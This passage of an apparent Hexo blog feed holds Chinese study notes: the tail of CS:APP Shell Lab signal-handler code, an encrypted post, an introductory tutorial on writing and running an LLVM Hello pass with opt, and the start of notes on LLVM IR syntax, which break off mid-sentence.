class="string">&quot;sigint_handler: entering&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if fg exists send SIGINT，// 发送SIGINT给前台进程组里的所有进程，包括子进程。</span></span><br><span class="line">    <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kill(-pid, SIGINT) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill (sigint) error&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;sigint_handler: Job (%d) killed\n&quot;</span>, pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// end handler</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigint_handler: exiting&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigstp_handler: entering&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if fg exists then send SIGSTP to job</span></span><br><span class="line">    <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kill(-pid, SIGTSTP) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill (tstp) error&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;sigstp_handler: Job [%d] (%d) stopped\n&quot;</span>, job-&gt;jid, pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// end handler</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigstp_handler: exiting&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Malloc-Lab"><a href="#Malloc-Lab" class="headerlink" title="Malloc Lab"></a>Malloc Lab</h3><p>先占个坑</p><h3 id="Proxy-Lab"><a href="#Proxy-Lab" class="headerlink" title="Proxy Lab"></a>Proxy Lab</h3><p>+1</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>这是一个笔记</title>
      <link href="posts/17122941/"/>
      <url>posts/17122941/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Here's something encrypted, password is required to continue reading.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="40a8375ff92f05bec93923fe3c3a6d38728b188023074a535cf27f0cd9d1c29d">23c98bc4e88201af417863563b43fca032f5a6222ede06686b94a7df44e9ad2da3cd47fb7bfbc0a5a0c8396e4760499d82fd9499edb5298ee890d2afb5ef29b7b47e27e62b9addbcffc3381cb7fb3d652ef4bdaf0c891338a231436e0395b192b73df6ad3bc96a03fc0571da5902013455675be28ac39fcd2670b17b8e5d9c3db7d5b4cb2774493599221f233ee72bcc44af197661772dc077c31d56e0ef34fa84ee7133fa7e986c73c934f146360c7242149181d231cc1be9cfbc48c9c7e1c70bb62bbf5f258f3c7da703a30a9b25a20ba39aa98954e0febff715a94db6ee3f5793f4b0e9bd7da0c0238b812c1dd50228a864871d399c357f11bab31de7da6446cb21f940d0460f34bce8426e05345825f8652818c0d9b5242cf66a2576e15a2c114b389afe29b54fa7c1523562e83e9ec2b84cc24645e40ca4be27d0c3dd26634df15e1de4573dbaa59c5855123fab7c5abf99fbb28eaac56aeb5fb31ade781d529224f3496e8701710cfe9e648359d80433e93b5f0c2964694616306927e7a130d8b75890c52f35b6f0fffecfbfbfc4cc3d4127ece931762c14524a878feef3bd3a33f7ca5d05fece1fddefbf7368b99b52f679f11513af5d2c6128720f8f3976a3dd61d32cc4020ebf4971f8364c51c42d84bc3257ecc1932435f2c4e45de56cf613cb8343f52976407c0fe34a691bf0d7eb8a7711f5288059bf40aff9588b9f3c42595aa7757639f7f1888931e5d7dfb5264d3738ccf304c82dfbb1ebfd69e9d6c9c0de093a567c6a78db348d2cfb7ef9783174e0473b179d314db4241dcb75d27bf8544aa6e5d7f6eba3377b6736b5c58e8498e4ef2667a669309afca4f14757787aa853e327c672bf815267010e935d4328691ad4c92ed37d64dd709e9835de5a898fec6a861b3c179a0f6d8aaf7634cb4a14b8787cbd89a8851e3c9df08fa1cc985e92a431d179df5b815f179e638cf2b7df12fdcb5e1948532efc68b718ac6d21cd532968f17761bcdb7c4b2c44bc060bfea063aee9da72c84f4d49005b7166dd5bb23a4311d88df7b710e0415cc225a1331a513855346ae21f70c6d51d4ce5b5da721f1947cd324f04143cb8113b3c385a771a9ee8a23fbc57dd6f068afaf7037cd0110c2710b7fe5b7951c42c1c4694f6d661c85f69e2815dc87d666ff76ad30d534790c942df963e21506b55dfb97f1c566dd3e6ca5be3c332e6d0f92af5141ff30631af762d48b2e8ce9d3a63fd46786fb4abc87c95378b40372384b7b36d4a2019807eec89c9c2e6c77cf23b481d6bf2d38b10da1a2e9073ca5f5cb4ef176110ec9a445da5fdc5d58fe692fd56de84ce9ff946fa6e1cfef70637a9b96bcdfbe53f2366ba1a2d64fe8c961d7bf07c228a841d3395749503995d25661c368595814a0cda0aff4743bce354b6090db10b3ecbc8d619a7315a9a8e65bdeb8899790aa20ab103514a4ea6d53af279a68edd29f856caaf0d89a22348193b5169903bea54725cb81ccc9b59f96f306d5841198d5796759aecd0d8abfc5ef56169b7f5c3770d7515b69c4e359a941efe8db5a4f426379bfdc756f86c4039d07ec15361f8182919331c9d3a55346c959d05888c7a917463d81f3b9a551921a543da4059c23d12446948fc5e9583fb1623d41db87ea4dc456615e6638c064363429c4cfc0d2ef11d1e7a19910f9f4c21ef74ec67e385869187526241374bf58d26000c4a53756cf359941e02baa406840204280c95522df7291e3616a9f22e1b269311a357c6ad8c0ca239ba18a6fe71be7f0769bdb320eec9c65baddf62c81fff076edc3f03d1dfd2913670a86a23a3faa1efd0efa17ac084f30bc7ae7378017c6ebe268eb55b080f283a2e409cd31a9331720bf362c0d54a53ed89831f0c848662ec8f9b8af1ee0710e0998e6e4d619d1a2149d4a4964568b5a77f6be2d12f93de0513001e22db5921124875e451b38fa5df9128ed85f754ef55304ce947112835405f7522808445dc741fbaea3e0058557e39aee170d6165dcea724c79d3bd4ac05ba5d195b702ac84a370c907b85756c38accbfb7b688d78bfe583f06ce4e8bb4272302474c869d2689df825c0cfa2bf763382687a153e163873ab3b67bc0ed83fb82e095810d5d3d3b5f913e13b927fed6b0914c2ab054520df66a3877c0f508fa48b8d590f0b229bad2b6fd766c83ad2254413cfab5a6ab84ea10db07b586f6dabdb2a5cd01d2a60f9be136b02b8d1c9684eb9eaa15cd07509b099939c2a566f9f48e27db324f753a9540acfc9c564d5fc8f99b37e55fa00fb052fada5424724ebb7d707fbc4ec844716a9ad02828bbad5764a22f9811a4e794de1d28ce819e02fc2d161fe0ec0718ad668671df05243cc6f81ef6f2219b2bcaf58771da37363702b84568e37660f8840c9b9b8cebfc01f7a5e20e84448c64c6c09dcfed6c0ee3723b9594ac977ceba02ad4c6637a4c0ba70d36fc633fbd2c5ba360b2157e3d36f4e1d4d5db5225216526fa0075bb948afde3b9c695abe9e435c236b4a13f8f369feb55e6048bdd2e8320f6eeea00a0be3a92d78c6b8807dba59735ebdb1942a9025479fae431e7cf452afa985ddf5ba6ed9b1a64f3c6af79b711ea2030a6d4416f1a624d53378dc0d70e0766f2c5125fbd4d213a22da53ea8914eeb93bdc4963afc0c6185c3a4af64c4a63fa9e7a3cbea6f77324c13d20ed5e662885b84a3f4a0ed419bfb800ca346add3efc2ede713f5e5bd2657a0fafbf57a900600722711bcb27719ee3b497ca3aa507c036f8510c69e6cbf957ed05be0e175e7910e25ea0ace4b7eebdc706e9925037dabc842e2c2bd4aac87c4d641ee5eb815d571d148731b757bbb91c6a3ebc76f701b744916137033ab729834898ed6b18d8e9b914844e7e5629f8ef18a3252338c0e30b9d4d1995e4e972024e45f09f18beec843cc99dd17daccf295cb4a0d51879f406cd2d77fe7387055569f4c43876a3a28ce7da59d789037463b80ffb31e9457fb60b817a9b0a3ea649d571e532bbbfaf63ff3b483be3a56284ac5de10eb12634538980c7ec31b0618b493feff8ea2972f448aee0e73175608664505730900651b772dacb68d01328af3250058fb02bf199f1c7bf8390ddde22aa28da672f402887641fa5ac20d8938c50a44763d1a2cf9f32e259aed665e2e07b99786f719c05e15bb65ee22bc5e820256187d59e1db2bfb3622310f66ab88f653fcc60f7cc48a3ec0452c9644da88be4a6b8a5409c701f8d061243abc5e46c3f3df2b756f2b03aeecdd19d44d40e71850cb79994ebda44a40060c29aef1ee04fab9931776b0621fddf06ca77526c63c75fdcee9fba9534756aedbc53576d3e8195e0aad4ffd65e89ae6438f134101bf81c3259ad1327591c60a32832f6264f19c434d537c154902f414cb727b1a9eaf4a7ff93570fd030f912149ceee63530e4175bf67e7d468f45e4c7aa6dfd92dd2c2e47a3fbf7084dbd252be23db90b321c633b5ee969b553dc87dbed1c83eb3cd06503b9c035840b3ade449505fb8474ff9d8bd3edc3ed87983fd719586ee40888070911dcfb592aa151723310b8da1526a4c83cb063b7dafa924878086e8db56e105d9638277e40e863fb97d9b0d7d8654aebc28fe6d0f1f7e5d716969c2a9cc6379c06bd28f0f00f460712633c81e7ad82dbfca9e9d39b339f1a732c0e807f1ba571ae5a8584f17b15597887a11da812f9836710051e7ebb89558ab69da4a3e2e3acfdcf7779601df7145d7e688f8a91cde872eaa6a3d53c1c9183a4149bc82ffabc2449d9cacd36c52c9dc047c9639787f461188b112febea75e7b3d5a77ec4e4d77a5c6378cd1e677f5a5baef94cfce41a5fa21b1573c6251b97a37411034441bd67a69ef6137e5702179764ce9c655fb57dec61adcbe66d2f706082a637a371f510c7fff121f32a2cccc24058d52a8ef73c3f819a83e356b58c616dc1a17c56fd9f87700f8e571b922b0c08609499cbaac56867826079d86fa252de75d812af77e42dee3e2562bafe4933e33e0a471cec3df64c3c141180ad9c4b6f564593e3fe5f485d533f03ca6b0e1a9374d392cb035bc76296c6f1f52632f540ef0feacc412e58e304a8733983d4a8c1f2a1d870f9a1821434b219b1205cb6a8e19f7de12c0e07ec6ecddaacbfd6185921c13f415c6f27c72a9b2fb8898e15bb23e1dfd45b688360d28dfc4672350eca4d8a3958e22ecd59852b61231355e782ffe6df3a3c86e558c2a1527b2ff2f8d05c21f1256fd00a4d79ad026b5608f39cc838eeffa8e1db8c9cee1801c9fffe25916a0445741b546166582177260b62882b3506e833bf2dac6a0a1d463284f1e131849dbe69a89cf4c8de180f5712e31d1d13bb0b1f8798029d297455ee51f34898cd803e419c08db471a6a39304f9bcfa7a59e8333b0b08006e695ff3e8c847c8f330cff4048e8426037f5d8049eef20bcadfd42c8031c72c618642c47dd3c7e5bcf896bf9523c641f4a5fbe36c5091bd867a3d919a22f149c9a37ca1c58f1f3238691cb7651e0fbbe832564ab6d7b4270e4923f884749aa45625c2762a72e216ae267924885f4a913e71f5d62b82a8b5b7c163a07ba78152969f55318c07a4a497b2cd76c742b73fa8b0c68431894401cc9289fc69c5c1438b78f3fc72daebfbf488254cd32a81a488f6ecd294fbacd6b0e1cd51f7973fda7ba911c948a3771d388aa62ba1c28184ec031e96b96ac44e5a43740084e87036b482796ade3efd0b1e536295cd91ea9d9b658c19a526727bf060d5cc66a21197fac365042e4f74a87f76dbc9595ca87c7502fbd39010ca62ce7c2c3c9545</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pass&quot;入门&quot;</title>
      <link href="posts/e671613c/"/>
      <url>posts/e671613c/</url>
      
        <content type="html"><![CDATA[<h2 id="pass简介"><a href="#pass简介" class="headerlink" title="pass简介"></a>pass简介</h2><p><code>pass</code>：llvm pass 是 llvm 架构的重要组成部分。pass 的主要工作是：对代码进行分析、优化代码。所有 llvm pass 都是<code>pass</code>的子类，通过通过重写从中继承的虚方法来实现功能<code>Pass</code>。LLVM Pass框架的一个主要特性是它根据传递遇到的约束（由它们派生自哪个类来指示）来调度传递以高效的方式运行。</p><p><code>pass</code>大致可以分为两类：分析和转换。分析类的<code>pass</code>以提供信息为主，转换类的则要修改中间代码。</p><p><code>pass</code>类如下：</p><ul><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-immutablepass-class">ImmutablePass</a>：不运行, 不改变状态也永不更新的<code>pass</code>, 一般情况下用于显示编译器的配置信息.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-modulepass-class">ModulePass</a>：用于执行任何非结构化的过程间优化。通用类型的<code>pass</code>，将整个程序示为一个单元处理。用<code>virtual bool runOnModule(Module &amp;M) = 0;</code>来实现<code>ModulePass</code>.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-callgraphsccpass-class">CallGraphSCCPass</a>：用于被那些需要从底向上(bottom-up)遍历call graph的pass调用.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-functionpass-class">FunctionPass</a>：是以单个函数为作用域的<code>pass</code>, 每个函数间是相互独立的, 相互之间无法影响</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-looppass-class">LoopPass</a>：是以单个<code>loop</code>为作用域的<code>pass</code>, 每个<code>loop</code>间相互独立. <code>LoopPass</code>以嵌套方式处理循环, 外层循环最后处理.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-regionpass-class">RegionPass</a>：类似与<code>LoopPass</code>，但是在函数中的每个单入口单出口区域执行。 <code>RegionPass</code>以嵌套顺序处理，以便最后处理最外面的区域。p</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-basicblockpass-class">BasicBlockPass</a>：用于实现本地优化，优化通常每次针对一个基本块或指令运行。</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-machinefunctionpass-class">MachineFunctionPass</a>：类似<code>FunctionPass</code>, 区别在于前者属于<code>LLVM code generator</code>(后端), 生成架构相关代码, <code>FunctionPass</code>属于<code>LLVM optimizer</code>(中端), 生成通用的IR.</p></li></ul><h2 id="pass”入门”"><a href="#pass”入门”" class="headerlink" title="pass”入门”"></a>pass”入门”</h2><h3 id="编写-分析"><a href="#编写-分析" class="headerlink" title="编写/分析"></a>编写/分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~&#x2F;llvm&#x2F;llvm-7.0.1.src&#x2F;lib&#x2F;Transforms&#x2F;Hello</span><br><span class="line">$ ls</span><br><span class="line">CMakeLists.txt  Hello.cpp  Hello.exports</span><br></pre></td></tr></table></figure><p><a href="https://llvm.org/docs/WritingAnLLVMPass.html">https://llvm.org/docs/WritingAnLLVMPass.html</a></p><p>可以参考官方教程再自己搞一个。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Hello</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line">  Hello() : FunctionPass(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    errs() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">    errs().write_escaped(F.getName()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="function"><span class="params">    [](<span class="keyword">const</span> PassManagerBuilder &amp;Builder,</span></span></span><br><span class="line"><span class="function"><span class="params">       legacy::PassManagerBase &amp;PM) &#123; PM.add(<span class="keyword">new</span> Hello()); &#125;)</span></span>;</span><br></pre></td></tr></table></figure><p>对上述代码的一些分析：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span>&#123;</span><br></pre></td></tr></table></figure><p>开始一个新的匿名命名空间。在<code>C++</code>中匿名命名空间会引入静态全局作用域，类似C语言中的<code>static</code>关键字，它使在匿名命名空间内声明的内容仅对当前文件可见。</p><p>接着，声明我们的<code>Pass</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Hello</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br></pre></td></tr></table></figure><p>声明了一个<code>Hello</code>类，它是<code>FunctionPass</code>的子类。<code>FunctionPass</code>类一次只操作一个函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line">Hello() : FunctionPass(ID) &#123;&#125;</span><br></pre></td></tr></table></figure><p>声明一个 pass 的 ID，llvm 将会使用ID来定位这些pass。避免使用复杂的C++运行机制。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">      errs() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      errs().write_escaped(F.getName()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br></pre></td></tr></table></figure><p>定义<code>runOnFunction</code>方法，覆写从<code>FunctionPass</code>继承的虚函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> Hello::ID = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>初始化Pass ID。LLVM使用ID的地址来标识Pass，因此初始化值并不重要。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>注册类<code>Hello</code>，第一个命令行参数<code>hello</code>，并命名为<code>Hello World Pass</code>。最后两个参数描述了它的行为：如果传递遍历CFG而不修改它，则第三个参数设置为<code>true</code>; 如果pass 是分析 pass，那么将会有第四个参数，为<code>true</code>，反之则为<code>false</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><p>在我们刚刚创建的<code>build</code>内，执行 <code>make</code>，得到一个新文件<code>LLVMHello.so</code></p><p>我们在<code>~/llvm/build/lib</code>下可以找到对应的文件。</p><h3 id="使用opt命令运行pass"><a href="#使用opt命令运行pass" class="headerlink" title="使用opt命令运行pass"></a>使用opt命令运行pass</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ clang -S -O3 -emit-llvm hello.c</span><br><span class="line">$ opt -load LLVMHello.so -hello &lt; hello.ll &gt; /dev/null</span><br><span class="line">Hello: main</span><br><span class="line">$ opt -load LLVMHello.so -hello -time-passes &lt; hello.bc &gt; /dev/null</span><br><span class="line">Hello: main</span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">                      ... Pass execution timing report ...</span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">  Total Execution Time: 0.0001 seconds (0.0001 wall clock)</span><br><span class="line"></span><br><span class="line">   ---User Time---   --User+System--   ---Wall Time---  --- Name ---</span><br><span class="line">   0.0001 ( 56.3%)   0.0001 ( 56.3%)   0.0001 ( 56.4%)  Bitcode Writer</span><br><span class="line">   0.0000 ( 37.0%)   0.0000 ( 37.0%)   0.0000 ( 37.8%)  Hello World Pass</span><br><span class="line">   0.0000 (  6.7%)   0.0000 (  6.7%)   0.0000 (  5.8%)  Module Verifier</span><br><span class="line">   0.0001 (100.0%)   0.0001 (100.0%)   0.0001 (100.0%)  Total</span><br><span class="line"></span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">                                LLVM IR Parsing</span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">  Total Execution Time: 0.0001 seconds (0.0001 wall clock)</span><br><span class="line"></span><br><span class="line">   ---User Time---   --User+System--   ---Wall Time---  --- Name ---</span><br><span class="line">   0.0001 (100.0%)   0.0001 (100.0%)   0.0001 (100.0%)  Parse IR</span><br><span class="line">   0.0001 (100.0%)   0.0001 (100.0%)   0.0001 (100.0%)  Total</span><br></pre></td></tr></table></figure><p>我们可以使用opt命令通过您的Pass来运行LLVM程序。由于您已使用<code>RegisterPass</code>注册了Pass，因此一旦加载，您就可以使用 <strong>opt</strong> 工具访问它。</p><p><code>-load</code>选项指定 Pass 作为共享对象加载，加载后<code>-hello</code>才是有效的。（这也是注册Pass的原因之一）。因为 <code>-hello</code>没有修改任何东西，所以直接查看结果即可。</p><p>也可以通过 <code>opt -load LLVMHello.so-help |grep -i hello</code>来查看其他注册字符串，当然最后也可以查看一下运行时间。</p><p>大致了解了 <code>pass</code> 的流程和编写骨架吧。</p><p>参考：</p><p><a href="https://llvm.org/docs/WritingAnLLVMPass.html">https://llvm.org/docs/WritingAnLLVMPass.html</a></p><p><a href="https://www.cnblogs.com/Five100Miles/">https://www.cnblogs.com/Five100Miles/</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> llvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvm IR学习</title>
      <link href="posts/6f86e98f/"/>
      <url>posts/6f86e98f/</url>
      
        <content type="html"><![CDATA[<h3 id="IR结构"><a href="#IR结构" class="headerlink" title="IR结构"></a>IR结构</h3><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://i.loli.net/2020/07/12/n2eB89dIkVY4OT5.png" alt="llvm" style="zoom:50%;" /><ul><li>Module：每个<code>module</code>包含全局变量列表，函数列表，该模块所依赖的库（或其他module）列表，符号表以及有关目标特性的各种数据。</li><li>Function：编程语言中的函数，包括函数签名和若干个基本块，函数内的第一个基本块叫做入口基本块。</li><li>BasicBlock：是一组顺序执行的指令集合，只有一个入口和一个出口，控制流只能从第一个指令进入该块。非头尾指令执行时不会违背顺序跳转到其他指令上去。每个基本块最后一条指令一般是跳转指令（跳转到其它基本块上去），函数内最后一个基本块的最后条指令是函数返回指令。</li><li>Instruction：指令是LLVM IR中的最小可执行单位，每一条指令都单占一行</li></ul><h3 id="IR语法"><a href="#IR语法" class="headerlink" title="IR语法"></a><a href="https://llvm.zcopy.site/docs/langref/">IR语法</a></h3><h4 id="获取IR"><a href="#获取IR" class="headerlink" title="获取IR"></a>获取IR</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ clang -emit-llvm -c hello.c -o hello.bc    <span class="comment">#二进制码</span></span><br><span class="line">$ clang -emit-llvm –S -c hello.c -o hello.ll <span class="comment">#获取IR</span></span><br></pre></td></tr></table></figure><h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><ul><li>LLVM 汇编语言中的注解以分号 <code>;</code>开始，并持续到行末</li><li>全局标识符要以 <code>@</code> 字符开始。所有的函数名和全局变量都必须以 <code>@</code> 开始。</li><li>LLVM 中的局部标识符以百分号 (<code>%</code>) 开始。标识符典型的正则表达式是 <code>[%@][a-zA-Z$._][a-zA-Z$._0-9]*</code>。</li><li>LLVM 拥有一个强大的类型系统，LLVM 将整数类型定义为 <code>i*N*</code>，其中 <em>N</em> 是整数占用的字节数。如：i32，i64</li><li>矢量或阵列类型声明为 <code>[no. of elements X size of each element]</code>。对于字符串 “Hello World!”，可以使用类型 <code>[13 x i8]</code>，假设每个字符占用 1 个字节，再加上为 NULL 字符提供的 1 个额外字节。</li><li><code>hello-world</code> 字符串的全局字符串常量进行如下声明：<code>@hello = constant [13 x i8] c&quot;Hello World!\00&quot;</code>。使用关键字 <code>constant</code> 来声明后面紧跟类型和值的常量。</li><li>LLVM 允许声明和定义函数。以关键字 <code>define</code> 开始，后面紧跟返回类型，然后是函数名。返回 32 